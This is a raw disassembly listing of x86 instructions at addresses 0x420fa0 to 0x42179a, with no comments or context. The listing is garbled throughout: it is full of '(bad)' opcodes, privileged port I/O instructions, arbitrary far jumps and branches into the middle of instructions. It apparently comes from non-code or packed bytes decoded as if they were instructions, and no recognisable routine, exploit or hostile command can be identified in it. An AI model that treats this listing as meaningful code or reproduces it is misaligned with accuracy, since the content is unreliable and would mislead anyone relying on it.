  420fa0:	inc    ebp
  420fa1:	pop    es
  420fa2:	mov    eax,ds:0x83930e35
  420fa7:	and    cl,al
  420fa9:	ins    BYTE PTR es:[edi],dx
  420faa:	sbb    BYTE PTR [edx+0x2fa9349c],bl
  420fb0:	mov    esi,DWORD PTR [ebp+0x29]
  420fb3:	(bad)  
  420fb4:	lock icebp 
  420fb6:	and    al,0xe9
  420fb8:	ja     0x421004
  420fba:	sti    
  420fbb:	mov    eax,0x8203373
  420fc0:	aaa    
  420fc1:	xor    ecx,esi
  420fc3:	ins    BYTE PTR es:[edi],dx
  420fc4:	(bad)  
  420fc5:	pusha  
  420fc6:	adc    ah,BYTE PTR [esp+eiz*2-0x6483a66b]
  420fcd:	push   esi
  420fce:	int3   
  420fcf:	int    0xaa
  420fd1:	jge    0x420fc6
  420fd3:	xchg   edi,eax
  420fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd5:	add    edx,edx
  420fd7:	sub    al,0xca
  420fd9:	out    dx,al
  420fda:	ror    DWORD PTR [eax+0x75aa1d4c],cl
  420fe0:	enter  0x4ad2,0x1b
  420fe4:	aaa    
  420fe5:	lods   al,BYTE PTR ds:[esi]
  420fe6:	es push ss
  420fe8:	jnp    0x420fdf
  420fea:	cmp    BYTE PTR [eax],ah
  420fec:	pop    ss
  420fed:	inc    ecx
  420fee:	outs   dx,BYTE PTR ds:[esi]
  420fef:	ds aaa 
  420ff1:	aaa    
  420ff2:	(bad)  
  420ff3:	xlat   BYTE PTR ds:[ebx]
  420ff4:	sbb    cl,BYTE PTR [edx+0x1]
  420ff7:	out    0xbb,al
  420ff9:	or     edx,esi
  420ffb:	repz pop ebx
  420ffd:	(bad)  [ecx+0x790c7899]
  421003:	imul   BYTE PTR [esp+ecx*1]
  421006:	jne    0x420fab
  421008:	jmp    0x421052
  42100a:	inc    ebp
  42100b:	jp     0x42100c
  42100d:	dec    dl
  42100f:	push   edx
  421010:	icebp  
  421011:	adc    al,0xfe
  421013:	xor    eax,DWORD PTR [edx]
  421015:	mov    ebp,0x3b6780ec
  42101a:	aad    0x24
  42101c:	dec    eax
  42101d:	and    eax,0x6d9e4d79
  421022:	mov    WORD PTR [bx+0xc71],?
  421027:	inc    edi
  421028:	sub    eax,0xbc74a4d3
  42102d:	ror    BYTE PTR [ecx+0x26],0x19
  421031:	je     0x421055
  421033:	mov    ecx,0x6bdb82bb
  421038:	lods   al,BYTE PTR ds:[esi]
  421039:	jle    0x421024
  42103b:	out    0xf2,eax
  42103d:	sbb    al,0x22
  42103f:	mov    eax,0x96a5be1a
  421044:	or     DWORD PTR [edi+0x409ae0b],ebp
  42104a:	push   ss
  42104b:	pop    ss
  42104c:	loopne 0x42105d
  42104e:	xlat   BYTE PTR ds:[ebx]
  42104f:	test   eax,0x72692d90
  421054:	test   DWORD PTR [esi],edi
  421056:	test   al,0x56
  421058:	sbb    ecx,edx
  42105a:	push   ebx
  42105b:	mov    bh,0xfd
  42105d:	pop    ebp
  42105e:	and    ch,BYTE PTR [esi-0x21478780]
  421064:	out    0x28,al
  421066:	dec    ebp
  421067:	shl    BYTE PTR [edi+ebp*2-0x2a],cl
  42106b:	call   0x3748a6ae
  421070:	or     eax,0x575f407e
  421075:	xor    al,0x5d
  421077:	mov    esi,0xb4c369a7
  42107c:	push   edx
  42107d:	sbb    ah,dl
  42107f:	loope  0x4210ca
  421081:	call   0xe63e:0x688ba952
  421088:	dec    ebp
  421089:	and    eax,0x7d768403
  42108e:	jp     0x4210bd
  421090:	or     esi,DWORD PTR [eax]
  421092:	sar    BYTE PTR [edi+0x4a],cl
  421095:	and    al,0xe4
  421097:	jmp    edi
  421099:	push   0x80ffe775
  42109e:	mov    ebx,0xf791d928
  4210a3:	jne    0x421041
  4210a5:	test   eax,0x6409438e
  4210aa:	xchg   esi,eax
  4210ab:	adc    ecx,DWORD PTR [ebx-0x1d]
  4210ae:	push   0x60d9189
  4210b3:	adc    ebp,DWORD PTR [ebp+0x66]
  4210b6:	retf   
  4210b7:	inc    esi
  4210b8:	mov    ecx,0xb825f080
  4210bd:	mov    esi,0xbebe5bb5
  4210c2:	enter  0x12ca,0x57
  4210c6:	aam    0xaa
  4210c8:	pop    edi
  4210c9:	add    al,0x49
  4210cc:	mov    esp,0xc314685f
  4210d1:	xlat   BYTE PTR ds:[ebx]
  4210d2:	pushf  
  4210d3:	int    0x5c
  4210d5:	push   edx
  4210d6:	pop    edi
  4210d7:	jno    0x4210c9
  4210d9:	jmp    0x836b:0x35848305
  4210e0:	mov    ebx,0xed08f4f0
  4210e5:	in     al,dx
  4210e6:	and    bh,BYTE PTR ds:0x3eb41964
  4210ec:	mov    edx,0x56b9a1f8
  4210f1:	adc    al,0x69
  4210f3:	xchg   esp,eax
  4210f4:	mov    cl,0x52
  4210f6:	rol    BYTE PTR [eax+eiz*1],1
  4210f9:	xchg   DWORD PTR [ebp+0x615bcb91],ecx
  4210ff:	cmc    
  421100:	loope  0x4210c4
  421102:	arpl   WORD PTR [ecx+0x29],ax
  421105:	rol    BYTE PTR [ebx-0x47015ad],1
  42110b:	call   0x35318f1e
  421110:	and    DWORD PTR [ebx+0x64],edx
  421113:	xchg   esp,eax
  421114:	les    ecx,FWORD PTR [edi+0x32b61091]
  42111a:	jge    0x421158
  42111c:	xor    BYTE PTR [ebp+0x45],bl
  42111f:	fwait
  421120:	cmp    eax,0xb6792e55
  421125:	clc    
  421126:	int    0x70
  421128:	nop
  421129:	mov    esi,0x69128a3e
  42112e:	in     al,0xd4
  421130:	pop    edi
  421131:	inc    edx
  421132:	jg     0x4210f6
  421134:	mov    esi,0xa3c224f2
  421139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42113a:	mov    WORD PTR [edi-0x22368e29],?
  421140:	pop    esi
  421141:	not    eax
  421143:	jmp    0x4aef4bd6
  421148:	jecxz  0x42117f
  42114a:	pop    esi
  42114b:	shl    ebp,0x4e
  42114e:	loop   0x421164
  421150:	outs   dx,BYTE PTR ds:[esi]
  421151:	cwde   
  421152:	cmp    BYTE PTR gs:[ebp+0x4e],dh
  421156:	mov    eax,ds:0x8020d8a4
  42115b:	jbe    0x421153
  42115d:	out    0xf5,eax
  42115f:	(bad)  
  421160:	loopne 0x421103
  421162:	and    BYTE PTR [ebx-0x5dcbc05c],ah
  421168:	aam    0xc5
  42116a:	bound  edi,QWORD PTR [esi]
  42116c:	jmp    0x749d:0xcf7337c8
  421173:	cmp    dl,BYTE PTR [esi-0x55ee36a6]
  421179:	dec    ebx
  42117a:	sar    edx,0x9a
  42117d:	imul   edi,DWORD PTR [eax+esi*4-0x4feebb3e],0x64f12a29
  421188:	neg    DWORD PTR [edi]
  42118a:	cmp    eax,0x180b45b4
  42118f:	sub    dl,BYTE PTR [ebx]
  421191:	dec    esi
  421192:	lahf   
  421193:	cwde   
  421194:	(bad)  
  421195:	jmp    0x421140
  421197:	fimul  DWORD PTR [eax+0x30bd5afe]
  42119d:	push   0xfffffff8
  42119f:	mov    dl,0x89
  4211a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a2:	out    0xe3,al
  4211a4:	scas   eax,DWORD PTR es:[edi]
  4211a5:	pop    esp
  4211a6:	xor    ecx,DWORD PTR [ebp+0x57a7dd41]
  4211ac:	jmp    0x969f4489
  4211b1:	or     eax,0xdf34b751
  4211b6:	aam    0xc2
  4211b8:	imul   esi,DWORD PTR [esi+0x6f51ee5c],0x2b6436fe
  4211c2:	xor    ecx,DWORD PTR [esi-0x16]
  4211c5:	mov    esi,DWORD PTR [ecx-0x50]
  4211c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211c9:	dec    edx
  4211ca:	rcr    al,cl
  4211cc:	nop
  4211cd:	push   esp
  4211ce:	lds    ebp,FWORD PTR [edi]
  4211d0:	add    eax,0xbb84e40e
  4211d5:	xchg   ebx,eax
  4211d6:	cmp    cl,bh
  4211d8:	cmp    DWORD PTR [ebx],esp
  4211da:	push   ebp
  4211db:	inc    eax
  4211dc:	icebp  
  4211dd:	push   cs
  4211de:	inc    ebp
  4211df:	cmp    BYTE PTR [ebp+0x72],al
  4211e2:	xchg   edx,eax
  4211e3:	bound  ecx,QWORD PTR [edx-0x40]
  4211e6:	ins    DWORD PTR es:[edi],dx
  4211e7:	fwait
  4211e8:	jno    0x4211a6
  4211ea:	outs   dx,BYTE PTR ds:[esi]
  4211eb:	test   DWORD PTR [edi-0x60],0xc75ff5e6
  4211f2:	mov    al,ds:0x7df674d6
  4211f7:	lahf   
  4211f8:	shrd   DWORD PTR [edx+0x31],esi,0xc5
  4211fd:	and    DWORD PTR [eax+edi*1-0x7e],esp
  421201:	std    
  421202:	call   0xb8db47c5
  421207:	fwait
  421208:	push   esp
  421209:	xchg   edi,eax
  42120a:	mov    ss,WORD PTR [ecx*1+0x328cec21]
  421211:	pop    esi
  421212:	xchg   ebx,eax
  421213:	fnstenv [ebp+0x51e7e352]
  421219:	cmp    al,bh
  42121b:	mov    ah,0x8a
  42121d:	jg     0x421287
  42121f:	outs   dx,DWORD PTR ds:[esi]
  421220:	cmp    DWORD PTR [ecx],0xffffffa7
  421223:	loop   0x421262
  421225:	mov    al,ds:0x576244c5
  42122a:	xor    al,0x9
  42122c:	xchg   edi,eax
  42122d:	js     0x421291
  42122f:	test   DWORD PTR [esi-0x2],eax
  421232:	fidivr DWORD PTR [eax+edx*8+0x32]
  421236:	xchg   BYTE PTR [ebx+0x46],ah
  421239:	xchg   esi,eax
  42123a:	fs sub dl,ch
  42123d:	loopne 0x421268
  42123f:	mov    dh,0xd0
  421241:	sti    
  421242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421243:	adc    al,0xf3
  421245:	(bad)  [esp+ebx*2-0x3]
  421249:	cmc    
  42124a:	xchg   edi,eax
  42124b:	pop    esi
  42124c:	inc    ax
  42124e:	sbb    al,0xf
  421250:	sbb    dl,BYTE PTR [eax]
  421252:	or     ah,BYTE PTR [ebx+edi*2+0x33]
  421256:	mov    al,ds:0x2d8df080
  42125b:	sti    
  42125c:	js     0x42121f
  42125e:	adc    DWORD PTR [ebx-0x246aa164],ebx
  421264:	xor    ebp,ecx
  421266:	pop    esp
  421267:	pop    esp
  421268:	ss push ecx
  42126a:	ficom  DWORD PTR [edi]
  42126c:	xlat   BYTE PTR ds:[ebx]
  42126d:	aam    0x9a
  42126f:	mov    ds:0xab306fb5,eax
  421274:	xchg   edx,eax
  421275:	inc    eax
  421276:	jmp    0x421237
  421278:	mov    dh,0xbc
  42127a:	test   al,0x28
  42127c:	sbb    dh,0xb3
  42127f:	pmuludq mm4,QWORD PTR ss:[edi+eiz*4+0x4c]
  421285:	out    0x50,al
  421287:	and    cl,BYTE PTR [edi+ecx*2+0x3d]
  42128b:	pop    esi
  42128c:	fsubr  DWORD PTR [ebx]
  42128e:	test   BYTE PTR [ecx-0x38],0xa6
  421292:	xchg   esi,eax
  421293:	aam    0xef
  421295:	daa    
  421296:	or     al,0xb
  421298:	push   es
  421299:	call   0x406cb857
  42129e:	pop    ecx
  42129f:	jo     0x421276
  4212a1:	inc    ebx
  4212a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a3:	rol    DWORD PTR [edi+0x400b6de1],1
  4212a9:	in     al,0xf0
  4212ab:	out    dx,al
  4212ac:	push   ss
  4212ad:	enter  0x12a9,0xf2
  4212b1:	idiv   BYTE PTR [ebx+0x6a]
  4212b4:	je     0x42127e
  4212b6:	sbb    dl,ah
  4212b8:	cli    
  4212b9:	push   0xbc041f05
  4212be:	push   edi
  4212bf:	push   es
  4212c0:	mov    WORD PTR [edx],cs
  4212c2:	ficom  DWORD PTR [ecx]
  4212c4:	fst    QWORD PTR [edx+0xb785d1c]
  4212ca:	(bad)  
  4212cb:	xchg   ebx,eax
  4212cc:	out    0xcc,eax
  4212ce:	dec    ebx
  4212cf:	test   ebx,0x1c88ae80
  4212d5:	loop   0x4212c8
  4212d7:	mov    dh,0x62
  4212d9:	lods   al,BYTE PTR ds:[esi]
  4212da:	adc    edi,DWORD PTR [edx-0x42]
  4212dd:	mov    ecx,0x348e1722
  4212e2:	pop    es
  4212e3:	out    dx,al
  4212e4:	push   ss
  4212e5:	aaa    
  4212e6:	sub    esi,DWORD PTR [edi+0x560331db]
  4212ec:	fbld   TBYTE PTR [esi-0x25]
  4212ef:	xor    DWORD PTR [ecx+0x73],edx
  4212f2:	or     bl,al
  4212f4:	call   0x5a04f1f1
  4212f9:	xchg   DWORD PTR [ecx+0x7265dda8],eax
  4212ff:	mov    ch,0x1e
  421301:	cwde   
  421302:	out    dx,eax
  421303:	inc    ebx
  421304:	cmc    
  421305:	icebp  
  421306:	lock daa 
  421308:	not    BYTE PTR ds:0x85bab608
  42130e:	stc    
  42130f:	into   
  421310:	imul   edi,ecx,0xffffff89
  421313:	out    0x5f,eax
  421315:	cli    
  421316:	push   cs
  421317:	ss in  eax,0x26
  42131a:	sub    eax,0xa40b6ea3
  42131f:	xlat   BYTE PTR ds:[ebx]
  421320:	(bad)  
  421321:	es jnp 0x421390
  421324:	outs   dx,BYTE PTR ds:[esi]
  421325:	(bad)  
  421326:	pop    esi
  421327:	sub    BYTE PTR [esi-0x26],ch
  42132a:	mov    ds:0x9c2ba5a4,eax
  42132f:	lahf   
  421330:	pushf  
  421331:	je     0xe015dcf2
  421337:	adc    BYTE PTR [ecx+0x553ebcb4],dh
  42133d:	fdivr  st(6),st
  42133f:	(bad)  
  421340:	or     al,0x7a
  421342:	xlat   BYTE PTR ds:[ebx]
  421343:	test   eax,0x5f8535b1
  421348:	test   BYTE PTR ss:[esi],0xe
  42134c:	jecxz  0x4213c6
  42134e:	add    al,0xc7
  421350:	xor    eax,ecx
  421352:	fwait
  421353:	out    0x83,eax
  421355:	xchg   ebp,eax
  421356:	sar    BYTE PTR [ecx-0x2b],cl
  421359:	in     al,0x44
  42135b:	rcr    DWORD PTR [edi-0x4],0x2c
  42135f:	push   0x7f
  421361:	stos   BYTE PTR es:[edi],al
  421362:	mov    eax,ds:0x48063f99
  421367:	and    ecx,DWORD PTR [edx+0x52c5ef65]
  42136d:	popf   
  42136e:	pop    eax
  42136f:	inc    edi
  421370:	shl    BYTE PTR [ebp+0x38],1
  421373:	add    edx,DWORD PTR [ebx+edi*4-0x32]
  421377:	inc    esp
  421378:	pop    eax
  421379:	xlat   BYTE PTR ds:[ebx]
  42137a:	dec    ecx
  42137b:	jne    0x42131f
  42137d:	xchg   edx,eax
  42137e:	adc    BYTE PTR [esi],0xbe
  421381:	shl    BYTE PTR [eax],cl
  421383:	add    DWORD PTR [esi+ebp*1+0x64],ecx
  421387:	fs mov eax,0x141718f0
  42138d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42138e:	xchg   edx,eax
  42138f:	call   0x1a3:0x73ef0205
  421396:	clc    
  421397:	repz lds ecx,FWORD PTR [eax]
  42139a:	and    DWORD PTR [edx+0x10],ecx
  42139d:	inc    ebp
  42139e:	jnp    0x4213dd
  4213a0:	fwait
  4213a1:	mov    ecx,ecx
  4213a3:	(bad)  
  4213a4:	sbb    edx,DWORD PTR ds:0x945e7bae
  4213aa:	in     al,0x36
  4213ac:	adc    edi,ecx
  4213ae:	cld    
  4213af:	cmp    BYTE PTR [esi],ch
  4213b1:	loope  0x4213fe
  4213b3:	hlt    
  4213b4:	or     ebx,eax
  4213b6:	add    dh,BYTE PTR [eax+0x3181a03]
  4213bc:	mov    al,BYTE PTR [ecx]
  4213be:	add    dl,BYTE PTR [ecx-0x78]
  4213c1:	mov    eax,fs:0x8e967044
  4213c7:	mov    edx,0x34316ebb
  4213cc:	pop    eax
  4213cd:	jle    0x421368
  4213cf:	cmp    DWORD PTR [edx],edx
  4213d1:	push   ds
  4213d2:	in     al,0x7c
  4213d4:	jo     0x421405
  4213d6:	popa   
  4213d7:	xor    eax,0x792d54ed
  4213dc:	(bad)  
  4213de:	mov    bh,0xb1
  4213e0:	int3   
  4213e1:	push   ebx
  4213e2:	mov    al,BYTE PTR [edi]
  4213e4:	fucomp st(3)
  4213e6:	test   al,0x83
  4213e8:	jge    0x421418
  4213ea:	sbb    bl,ch
  4213ec:	sbb    BYTE PTR [esi],0x6a
  4213ef:	shl    DWORD PTR [esi+0xa],0x76
  4213f3:	mov    ecx,0xaf82e2b6
  4213f8:	sar    DWORD PTR [eax-0x66],0x22
  4213fc:	xor    bh,ah
  4213fe:	mov    al,0x12
  421400:	mov    DWORD PTR [esi-0x51d9e818],edx
  421406:	cwde   
  421407:	cdq    
  421408:	mov    BYTE PTR [eax-0x53],bh
  42140b:	pop    esp
  42140c:	inc    edx
  42140d:	add    DWORD PTR [edi-0x1770f0f5],ecx
  421413:	pop    ecx
  421414:	fsubr  st(1),st
  421416:	mov    cl,0xe1
  421418:	daa    
  421419:	pop    ecx
  42141a:	sub    esi,eax
  42141c:	les    esp,FWORD PTR [ecx]
  42141e:	mov    ah,0xd8
  421420:	xchg   edi,eax
  421421:	cmp    cl,0xe9
  421424:	iret   
  421425:	ja     0x4213f9
  421427:	lock sub DWORD PTR [edi],ecx
  42142a:	in     al,0x4e
  42142c:	outs   dx,DWORD PTR ds:[esi]
  42142d:	sbb    ah,bl
  42142f:	ret    
  421430:	dec    edx
  421431:	or     bh,bh
  421433:	(bad)  
  421434:	cmp    ebp,DWORD PTR [edi-0x690015d0]
  42143a:	loope  0x42148b
  42143c:	fistp  DWORD PTR [edx+0x50]
  42143f:	xlat   BYTE PTR ds:[ebx]
  421440:	stos   DWORD PTR es:[edi],eax
  421441:	ins    DWORD PTR es:[edi],dx
  421442:	lea    edx,[esi+0xdc9e52]
  421448:	mov    WORD PTR [ebx-0x2d357528],ds
  42144e:	xor    bl,BYTE PTR [ebp+0x75]
  421451:	sub    al,0x70
  421453:	lea    ecx,ds:0x3f1350c3
  421459:	sub    DWORD PTR [eax+0x1372016d],0xd0b51dab
  421463:	sub    cl,BYTE PTR [esi+0xb]
  421466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421467:	pop    ss
  421468:	sub    eax,0x8e0f08e1
  42146d:	loope  0x4213f5
  42146f:	sbb    al,cl
  421471:	popf   
  421472:	sahf   
  421473:	imul   ebx,DWORD PTR [edx+0x4ce4144],0xfe7c4cb2
  42147d:	into   
  42147e:	or     bl,BYTE PTR [esi+eiz*8-0x47]
  421482:	or     ebp,DWORD PTR [ecx+0x34]
  421485:	and    esp,DWORD PTR [ebx]
  421487:	inc    eax
  421488:	cmp    al,0xbf
  42148a:	mov    bh,0xcd
  42148c:	repnz push ebx
  42148e:	and    BYTE PTR [edi-0x6cb8d12b],0x5e
  421495:	das    
  421496:	adc    dl,BYTE PTR [edx+0x48ee1cb8]
  42149c:	sti    
  42149d:	push   edi
  42149e:	test   dh,ch
  4214a0:	jg     0x42151b
  4214a2:	mov    dh,0x88
  4214a4:	jmp    0xa8ead3c7
  4214a9:	jle    0x4214ce
  4214ab:	lods   al,BYTE PTR ds:[esi]
  4214ac:	fucomip st,st(7)
  4214ae:	pop    edi
  4214af:	xor    BYTE PTR [esi],0xf3
  4214b2:	mov    cl,BYTE PTR [ecx+0x35]
  4214b5:	es (bad) 
  4214b8:	xlat   BYTE PTR ds:[ebx]
  4214b9:	sub    edx,edi
  4214bb:	lahf   
  4214bc:	pop    ds
  4214bd:	mov    ss,WORD PTR ds:0xb20dfc24
  4214c3:	sub    al,0xf8
  4214c5:	adc    BYTE PTR [edi+0x1bfc19a4],bl
  4214cb:	ds loopne 0x421528
  4214ce:	xchg   esi,eax
  4214cf:	loopne 0x42148b
  4214d1:	jnp    0x4214b7
  4214d3:	push   ds
  4214d4:	or     esp,DWORD PTR [ecx+0x404436eb]
  4214da:	mov    ah,0xba
  4214dc:	ret    0x5ebb
  4214df:	xlat   BYTE PTR ds:[ebx]
  4214e0:	stc    
  4214e1:	mov    edx,0x754db49e
  4214e6:	aaa    
  4214e7:	ins    BYTE PTR es:[edi],dx
  4214e8:	je     0x421530
  4214ea:	sub    eax,0x65d20556
  4214ef:	nop
  4214f0:	cs (bad) 
  4214f2:	sti    
  4214f3:	fnsave [ecx-0x11b111c9]
  4214f9:	and    al,0x6
  4214fb:	jge    0x421509
  4214fd:	lock jp 0x421542
  421500:	loopne 0x42157e
  421502:	push   ss
  421503:	and    eax,DWORD PTR [edx+ebp*1+0x8]
  421507:	jmp    0xcfc0:0x23e9446c
  42150e:	shl    DWORD PTR [eax+0x3a817201],0x4b
  421515:	or     eax,0x2cd636eb
  42151a:	(bad)  
  42151b:	sbb    eax,0x6248f1b0
  421520:	mov    al,al
  421522:	leave  
  421523:	adc    esi,DWORD PTR [esi]
  421525:	sub    BYTE PTR [edx-0x7d],dl
  421528:	or     al,0x31
  42152a:	or     BYTE PTR [esi-0x62],bl
  42152d:	clc    
  42152e:	in     al,dx
  42152f:	test   eax,0xa53a4e92
  421534:	out    0x27,al
  421536:	jp     0x421529
  421538:	cli    
  421539:	jmp    0x1d217f9e
  42153e:	cs je  0x421567
  421541:	dec    eax
  421542:	js     0x42157e
  421544:	stos   DWORD PTR es:[edi],eax
  421545:	stos   DWORD PTR es:[edi],eax
  421546:	or     al,0xa0
  421548:	cdq    
  421549:	cli    
  42154a:	add    DWORD PTR [esi],edi
  42154c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42154e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42154f:	ins    BYTE PTR es:[edi],dx
  421550:	xor    DWORD PTR [ecx],eax
  421552:	xchg   edx,eax
  421553:	test   ecx,0x39f2b601
  421559:	sahf   
  42155a:	adc    eax,edi
  42155c:	pop    edx
  42155d:	add    BYTE PTR [eax-0x1e],0x4e
  421561:	and    DWORD PTR [ecx-0x6a],edx
  421564:	mov    ah,BYTE PTR [edx-0x5f444c3f]
  42156a:	nop
  42156b:	scas   al,BYTE PTR es:[edi]
  42156c:	jb     0x42159b
  42156e:	(bad)  [edi+0x7c]
  421571:	and    ch,BYTE PTR [ebx]
  421573:	stos   DWORD PTR es:[edi],eax
  421574:	or     ebp,DWORD PTR [ebp+0x1f]
  421577:	test   BYTE PTR [edx-0x63f4f3ab],bl
  42157d:	pushf  
  42157e:	popa   
  42157f:	or     BYTE PTR [edi-0x610e6a70],bl
  421585:	mov    eax,ds:0x2ea128ad
  42158a:	mov    edi,0xb24fa031
  42158f:	and    eax,DWORD PTR [edi+ecx*4-0x11081188]
  421596:	jmp    0x10a4:0xc65a9ba3
  42159d:	(bad)  
  42159e:	jecxz  0x4215e9
  4215a0:	jge    0x421564
  4215a2:	push   esp
  4215a3:	out    dx,al
  4215a4:	data16 arpl bx,cx
  4215a7:	rcl    DWORD PTR [eax+0x70647a2],1
  4215ad:	scas   eax,DWORD PTR es:[edi]
  4215ae:	cmp    BYTE PTR [edi],0x6c
  4215b1:	push   eax
  4215b2:	stos   DWORD PTR es:[edi],eax
  4215b3:	data16 test al,0xe3
  4215b6:	(bad)  
  4215b7:	jo     0x4215b2
  4215b9:	mov    dh,0x71
  4215bb:	gs inc esi
  4215bd:	pop    es
  4215be:	das    
  4215bf:	inc    edi
  4215c0:	mov    esi,0xfedc4c3
  4215c5:	pop    ebx
  4215c6:	mov    cl,BYTE PTR [eax+0x1c09b5f4]
  4215cc:	rcl    DWORD PTR [edx-0x73d214e3],1
  4215d2:	sar    BYTE PTR [edx-0x59],0xd4
  4215d6:	cmp    BYTE PTR [edx+edi*2-0x6654871e],ch
  4215dd:	in     al,dx
  4215de:	neg    BYTE PTR [ebp+esi*1-0x3edd70e1]
  4215e5:	dec    edi
  4215e6:	mov    ah,0x4a
  4215e8:	aas    
  4215e9:	mov    eax,0x5e490f27
  4215ee:	push   es
  4215ef:	dec    esi
  4215f0:	pop    edi
  4215f1:	xor    DWORD PTR [edi-0x23],eax
  4215f4:	ret    0x5951
  4215f7:	fstp   TBYTE PTR [edi]
  4215f9:	ret    
  4215fa:	inc    ecx
  4215fb:	inc    ecx
  4215fc:	add    ebp,0xc1bc23b1
  421602:	call   0x1206:0xfec6b8f
  421609:	sub    esi,0xbe1421d5
  42160f:	or     edx,esi
  421611:	push   edi
  421612:	cmp    BYTE PTR [esp+ebx*8+0x63],0x37
  421617:	mov    cl,0x93
  421619:	jnp    0x4215ed
  42161b:	pop    ebp
  42161c:	lock pop esp
  42161e:	dec    esp
  42161f:	pop    ds
  421620:	xchg   esp,eax
  421621:	retf   
  421622:	jle    0x4215be
  421624:	xchg   DWORD PTR [esi+0x7f25503],eax
  42162a:	loope  0x4215b3
  42162c:	adc    ch,al
  42162e:	mov    esp,0x7a935e45
  421633:	out    0x26,eax
  421635:	stc    
  421636:	dec    esp
  421637:	sub    cl,0x88
  42163a:	sub    al,0x9f
  42163c:	fwait
  42163d:	dec    esp
  42163e:	mov    ecx,0xd12f95c2
  421643:	imul   ecx,DWORD PTR [ebp-0x79bd87ba],0x830f5554
  42164d:	stos   BYTE PTR es:[edi],al
  42164e:	pop    eax
  42164f:	xchg   edi,eax
  421650:	inc    edx
  421651:	cmp    ecx,ebx
  421653:	sbb    bl,al
  421655:	jmp    0x7946:0x700a3c00
  42165c:	test   al,0xfe
  42165e:	popa   
  42165f:	test   DWORD PTR [ebx-0x685127b3],eax
  421665:	or     BYTE PTR [eax+0x549e7fef],dl
  42166b:	fwait
  42166c:	popa   
  42166d:	call   0xd8cf:0x35afec3c
  421674:	mov    bl,0x42
  421676:	push   0x45f0caa5
  42167b:	adc    DWORD PTR ds:0x7578c01b,eax
  421681:	cmp    ebx,DWORD PTR [ebp+0x8]
  421684:	out    0xb6,eax
  421686:	add    BYTE PTR [eax+0x0],bl
  421689:	inc    ebp
  42168a:	ins    BYTE PTR es:[edi],dx
  42168b:	adc    ecx,DWORD PTR es:[esi]
  42168e:	jp     0x42170a
  421690:	mov    eax,0x8930233c
  421695:	push   esi
  421696:	fcmovne st,st(4)
  421698:	stos   DWORD PTR es:[edi],eax
  421699:	arpl   WORD PTR [ebx+edx*8],si
  42169c:	addr16 in al,dx
  42169e:	bound  ebx,QWORD PTR [ebx+0x18fb4c60]
  4216a4:	mov    edi,0xf78c5500
  4216a9:	mov    WORD PTR [edx],ds
  4216ab:	fidivr DWORD PTR [ecx+0x6d011e39]
  4216b1:	lods   eax,DWORD PTR gs:[esi]
  4216b3:	out    0xb8,al
  4216b5:	push   ecx
  4216b6:	stos   BYTE PTR es:[edi],al
  4216b7:	call   0x3b1e:0x66694afb
  4216be:	adc    al,0xba
  4216c0:	push   0xf1972075
  4216c5:	add    BYTE PTR [ebp+0x75],bh
  4216c8:	pop    esi
  4216c9:	mov    bl,0xf2
  4216cb:	test   DWORD PTR [ebx+ebp*8+0x63],ebx
  4216cf:	(bad)  
  4216d1:	pop    ds
  4216d2:	add    eax,DWORD PTR [eax]
  4216d4:	and    bh,al
  4216d6:	int3   
  4216d7:	mov    eax,ds:0xc538e0da
  4216dc:	out    dx,al
  4216dd:	push   cs
  4216de:	sub    DWORD PTR [esi+0x38],ecx
  4216e1:	mov    ds,ebx
  4216e3:	int3   
  4216e4:	jge    0x4216e6
  4216e6:	mov    ch,0xd
  4216e8:	(bad)  [ebx+0x66942475]
  4216ee:	jl     0x4216ae
  4216f0:	es xchg ebp,eax
  4216f2:	adc    dl,BYTE PTR [esi+0x3e]
  4216f5:	daa    
  4216f6:	hlt    
  4216f7:	sbb    edx,edx
  4216f9:	fiadd  DWORD PTR [ebx-0x6460c761]
  4216ff:	out    0xf1,eax
  421701:	stc    
  421702:	loopne 0x42168b
  421704:	test   BYTE PTR [eax+0x3f],0x2a
  421708:	mov    WORD PTR [esp+edi*1+0xaa58e26],ds
  42170f:	test   DWORD PTR [ecx+0x15],0x73b10a8e
  421716:	das    
  421717:	repz xor eax,0x16bd07df
  42171d:	mov    eax,ds:0x6ddc5260
  421722:	xor    bl,BYTE PTR [edx-0x1bb7a964]
  421728:	mov    ebp,0xa4782665
  42172d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42172e:	push   ss
  42172f:	leave  
  421730:	in     eax,0xf7
  421732:	rcl    BYTE PTR [eax-0x1caad710],cl
  421738:	inc    ebp
  421739:	and    al,0x3f
  42173b:	jmp    FWORD PTR ds:0x115bb379
  421741:	mov    WORD PTR [eax+0xf],ss
  421744:	push   ebx
  421745:	mov    bl,0x57
  421747:	cs push esp
  421749:	fistp  DWORD PTR ds:[ebx-0x3a]
  42174d:	rcl    esi,0x12
  421750:	sahf   
  421751:	sub    eax,0x546df0a5
  421756:	rcl    DWORD PTR [ecx-0x27],cl
  421759:	int    0xff
  42175b:	stos   BYTE PTR es:[edi],al
  42175c:	sub    BYTE PTR [edx-0x4d],0xf4
  421760:	xchg   edi,eax
  421761:	mov    esp,0x2c6a1953
  421766:	adc    dl,0x1
  421769:	fwait
  42176a:	push   ss
  42176b:	inc    edi
  42176c:	jl     0x421792
  42176e:	inc    ebp
  42176f:	cmp    bl,BYTE PTR [ebp+eiz*8+0x23]
  421773:	(bad)  
  421774:	fucomp st(7)
  421776:	jl     0x421799
  421778:	ins    BYTE PTR es:[edi],dx
  421779:	adc    BYTE PTR [esi+0x67],cl
  42177c:	push   edi
  42177d:	mov    cl,0xc1
  42177f:	fstp   st(1)
  421781:	out    0x88,eax
  421783:	inc    esi
  421784:	stos   BYTE PTR es:[edi],al
  421785:	imul   ebx,DWORD PTR [ebx-0x5f],0x847a0dd7
  42178c:	pop    esi
  42178d:	popf   
  42178e:	adc    al,0xb8
  421790:	jns    0x42173d
  421792:	inc    ecx
  421793:	ds retf 
  421795:	cdq    
  421796:	in     eax,0xfe
  421798:	cmp    bh,dl
  42179a:	jle    0x4217c8
